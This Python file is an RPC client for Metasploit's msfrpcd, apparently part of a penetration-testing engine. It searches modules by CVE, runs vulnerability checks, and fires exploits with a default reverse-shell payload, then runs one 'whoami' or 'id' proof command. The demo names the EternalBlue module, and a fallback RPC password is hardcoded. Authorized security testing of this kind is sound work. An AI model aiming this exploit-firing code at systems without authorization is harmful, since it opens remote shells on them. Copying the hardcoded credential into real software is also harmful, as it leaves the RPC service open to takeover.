"""CONTRACT M — standalone Metasploit RPC client (msfrpcd).

A thin, best-effort msgpack-RPC client the pentest engine uses to (a) find
exploit/aux modules for a CVE, (b) run a NON-firing `check` against a host,
and (c) fire an exploit and pull ONE bounded read-only proof command from any
session that opens.

Every public method is best-effort: it returns a dict/bool/list and NEVER
raises. If `msgpack` isn't importable or msfrpcd is unreachable, `available()`
is False and the other methods return an `{"error": ...}` shape.

This is a NEW module. The existing `metasploit.py` connector adapter is left
untouched — this is the lower-level client Agent 2 imports:

    from grc.modules.connectors.providers.metasploit_rpc import MsfRpc

Env overrides: MSF_RPC_HOST, MSF_RPC_PORT, MSF_RPC_USER, MSF_RPC_PASSWORD,
MSF_RPC_SSL ("1"/"true" => https).
"""
from __future__ import annotations

import os
import time
from typing import Any, Dict, List, Optional

try:
    import msgpack as _msgpack
except Exception:  # ImportError or anything odd — degrade, don't crash import
    _msgpack = None

try:
    import requests as _requests
except Exception:
    _requests = None


# Metasploit CheckCode.name (lowercased by RPC) -> pinned 'code' set.
_CHECK_MAP = {
    "vulnerable": "vulnerable",
    "appears": "vulnerable",
    "detected": "unknown",
    "safe": "safe",
    "unknown": "unknown",
    "unsupported": "unsupported",
}


class MsfRpc:
    """msgpack-RPC client for msfrpcd. Best-effort, never raises out of a
    public method. Short socket timeouts so it never hangs a request."""

    def __init__(
        self,
        host: Optional[str] = None,
        port: Optional[int] = None,
        user: Optional[str] = None,
        password: Optional[str] = None,
        ssl: Optional[bool] = None,
        timeout: float = 8.0,
    ) -> None:
        self.host = host or os.getenv("MSF_RPC_HOST", "127.0.0.1")
        self.port = int(port or os.getenv("MSF_RPC_PORT", "55553"))
        self.user = user or os.getenv("MSF_RPC_USER", "msf")
        self.password = (
            password
            or os.getenv("MSF_RPC_PASSWORD")
            or "avaMsfPass1"
        )
        if ssl is None:
            ssl = os.getenv("MSF_RPC_SSL", "").strip().lower() in ("1", "true", "yes")
        self.ssl = bool(ssl)
        self.timeout = timeout
        self._token: Optional[str] = None

    # ─── transport ──────────────────────────────────────────────────

    @property
    def _url(self) -> str:
        scheme = "https" if self.ssl else "http"
        return f"{scheme}://{self.host}:{self.port}/api/"

    @staticmethod
    def _decode(o: Any) -> Any:
        """msfrpcd packs strings as msgpack `bin`, so unpackb(raw=False) still returns BYTES keys/values
        (e.g. {b'token': b'...'}). Recursively decode to str so `.get("token")` etc. work. Undecodable
        binary is kept as-is (only session-read blobs)."""
        if isinstance(o, bytes):
            try:
                return o.decode("utf-8")
            except Exception:
                return o
        if isinstance(o, dict):
            return {MsfRpc._decode(k): MsfRpc._decode(v) for k, v in o.items()}
        if isinstance(o, (list, tuple)):
            return [MsfRpc._decode(x) for x in o]
        return o

    def _post(self, payload: list) -> Any:
        """Raw msgpack POST. Raises on transport/decode error (callers wrap)."""
        body = _msgpack.packb(payload, use_bin_type=False)
        resp = _requests.post(
            self._url,
            data=body,
            headers={"Content-Type": "binary/message-pack"},
            verify=self.ssl,
            timeout=self.timeout,
        )
        if resp.status_code != 200:
            raise RuntimeError(f"msfrpcd HTTP {resp.status_code}: {resp.text[:120]}")
        return self._decode(_msgpack.unpackb(resp.content, raw=False))

    def _login(self) -> Optional[str]:
        reply = self._post(["auth.login", self.user, self.password])
        token = reply.get("token") if isinstance(reply, dict) else None
        self._token = token
        return token

    def _call(self, method: str, *args: Any) -> Any:
        """Authenticated call. Re-logs in once on a missing/expired token."""
        if not self._token and not self._login():
            raise RuntimeError("auth.login failed")
        try:
            return self._post([method, self._token, *args])
        except Exception:
            # token may have expired — re-login once, retry once.
            self._token = None
            if not self._login():
                raise
            return self._post([method, self._token, *args])

    @staticmethod
    def _split(module: str) -> tuple[str, str]:
        """`exploit/windows/smb/ms17_010` -> ('exploit', 'windows/smb/ms17_010')."""
        m = (module or "").strip().lstrip("/")
        if "/" in m:
            mtype, ref = m.split("/", 1)
            return mtype, ref
        return "exploit", m

    # ─── public API (never raise) ───────────────────────────────────

    def available(self) -> bool:
        if _msgpack is None or _requests is None:
            return False
        try:
            return bool(self._login())
        except Exception:
            return False

    def search_cve(self, cve: str) -> List[str]:
        """Exploit/aux module fullnames matching the CVE, via module.search."""
        try:
            reply = self._call("module.search", cve)
        except Exception:
            return []
        out: List[str] = []
        rows = reply if isinstance(reply, list) else (reply or {}).get("modules", []) \
            if isinstance(reply, dict) else []
        for row in rows or []:
            if isinstance(row, dict):
                name = row.get("fullname") or row.get("name")
                if name:
                    out.append(str(name))
            elif isinstance(row, (str, bytes)):
                out.append(row.decode() if isinstance(row, bytes) else row)
        return out

    def check(
        self,
        module: str,
        rhost: str,
        rport: Optional[int] = None,
        options: Optional[Dict[str, Any]] = None,
    ) -> Dict[str, str]:
        """NON-firing vulnerability check. Maps Metasploit CheckCode to the
        pinned {vulnerable|safe|unknown|unsupported|error} set."""
        mtype, ref = self._split(module)
        opts: Dict[str, Any] = {"RHOSTS": rhost}
        if rport:
            opts["RPORT"] = rport
        if options:
            opts.update(options)
        try:
            started = self._call("module.check", mtype, ref, opts)
        except Exception as exc:
            return {"code": "error", "detail": str(exc)[:200]}
        if not isinstance(started, dict):
            return {"code": "unknown", "detail": "no check response"}
        if started.get("error"):
            return {"code": "error", "detail": str(started.get("error_message") or started.get("error_string") or started.get("error"))[:200]}
        uuid = started.get("uuid")
        if not uuid:
            return {"code": "unsupported", "detail": "module has no check"}
        # Poll module.results briefly (bounded).
        deadline = time.time() + min(self.timeout * 4, 30.0)
        while time.time() < deadline:
            try:
                res = self._call("module.results", uuid)
            except Exception as exc:
                return {"code": "error", "detail": str(exc)[:200]}
            status = (res or {}).get("status") if isinstance(res, dict) else None
            if status == "completed":
                result = res.get("result") or {}
                code = str(result.get("code") or "unknown").lower()
                detail = str(result.get("message") or result.get("reason") or "")[:200]
                return {"code": _CHECK_MAP.get(code, "unknown"), "detail": detail}
            if status == "errored":
                return {"code": "error", "detail": str(res.get("error") or "check errored")[:200]}
            time.sleep(0.6)
        return {"code": "unknown", "detail": "check timed out"}

    def run_exploit(
        self,
        module: str,
        rhost: str,
        rport: Optional[int] = None,
        options: Optional[Dict[str, Any]] = None,
        payload: Optional[str] = None,
    ) -> Dict[str, Any]:
        """Fire the exploit; if a session opens, run ONE bounded read-only
        proof command and return its output. Best-effort, never raises."""
        result: Dict[str, Any] = {"session": None, "proof": "", "error": ""}
        mtype, ref = self._split(module)
        opts: Dict[str, Any] = {"RHOSTS": rhost}
        if rport:
            opts["RPORT"] = rport
        # Sensible default payload only for exploit modules.
        if mtype == "exploit":
            opts["PAYLOAD"] = payload or "generic/shell_reverse_tcp"
            # A reverse payload must call back to US. On the prod VM (behind VPN) that is the droplet's
            # VPN-facing IP — not guessable — so set AVA_MSF_LHOST (+ optional AVA_MSF_LPORT) for an
            # approved fire to open a session. Unset -> msf's own default (fine on a flat dev LAN).
            _lhost = os.getenv("AVA_MSF_LHOST")
            if _lhost:
                opts["LHOST"] = _lhost
            _lport = os.getenv("AVA_MSF_LPORT")
            if _lport:
                opts["LPORT"] = _lport
        if options:
            opts.update(options)
        try:
            before = self._session_ids()
            started = self._call("module.execute", mtype, ref, opts)
        except Exception as exc:
            result["error"] = str(exc)[:200]
            return result
        if isinstance(started, dict) and started.get("error"):
            result["error"] = str(started.get("error_message") or started.get("error_string") or started.get("error"))[:200]
            return result
        # Poll for a NEW session (bounded).
        sid = None
        deadline = time.time() + min(self.timeout * 5, 40.0)
        while time.time() < deadline:
            new = self._session_ids() - before
            if new:
                sid = sorted(new)[0]
                break
            time.sleep(0.8)
        if sid is None:
            result["error"] = "no session opened"
            return result
        result["session"] = sid
        try:
            result["proof"] = self._proof(sid)
        except Exception as exc:
            result["error"] = f"session {sid} opened, proof failed: {str(exc)[:120]}"
        return result

    # ─── session helpers ────────────────────────────────────────────

    def _session_ids(self) -> set:
        try:
            reply = self._call("session.list")
        except Exception:
            return set()
        if not isinstance(reply, dict):
            return set()
        ids = set()
        for k in reply.keys():
            try:
                ids.add(int(k))
            except Exception:
                ids.add(k)
        return ids

    def _proof(self, sid: int) -> str:
        """Run ONE read-only command in the session and return its output."""
        info = {}
        try:
            listing = self._call("session.list")
            if isinstance(listing, dict):
                info = listing.get(sid) or listing.get(str(sid)) or {}
        except Exception:
            pass
        stype = (info.get("type") or "").lower() if isinstance(info, dict) else ""
        platform = (info.get("platform") or info.get("session_host") or "").lower()
        is_windows = "win" in platform
        cmd = "whoami" if is_windows else "id"

        if stype == "meterpreter":
            try:
                self._call("session.meterpreter_run_single", sid, cmd)
            except Exception:
                pass
            time.sleep(1.0)
            out = self._call("session.meterpreter_read", sid)
        else:
            # shell session
            self._call("session.shell_write", sid, cmd + "\n")
            time.sleep(1.2)
            out = self._call("session.shell_read", sid)
        if isinstance(out, dict):
            data = out.get("data", "")
        else:
            data = out
        if isinstance(data, bytes):
            data = data.decode(errors="replace")
        return str(data or "").strip()[:2000]


def demo() -> None:
    """Self-check: constructs, and with the server down available() is False
    and nothing raises out of the public methods."""
    c = MsfRpc(host="127.0.0.1", port=1, timeout=1.0)  # nothing listens on :1
    assert c.host == "127.0.0.1" and c.port == 1
    assert c.available() is False
    assert c.search_cve("CVE-2017-0143") == []
    chk = c.check("exploit/windows/smb/ms17_010_eternalblue", "10.0.0.1", 445)
    assert isinstance(chk, dict) and chk["code"] in {"error", "unknown"}, chk
    ex = c.run_exploit("exploit/windows/smb/ms17_010_eternalblue", "10.0.0.1", 445)
    assert ex["session"] is None and ex["error"], ex
    # env override + default password
    d = MsfRpc()
    assert d.host == os.getenv("MSF_RPC_HOST", "127.0.0.1")
    assert d.password  # env or the default
    assert d._split("exploit/windows/smb/x") == ("exploit", "windows/smb/x")
    assert d._split("x") == ("exploit", "x")
    assert _CHECK_MAP["appears"] == "vulnerable" and _CHECK_MAP["safe"] == "safe"
    print("metasploit_rpc demo OK (msgpack=%s requests=%s)" % (
        _msgpack is not None, _requests is not None))


if __name__ == "__main__":
    demo()
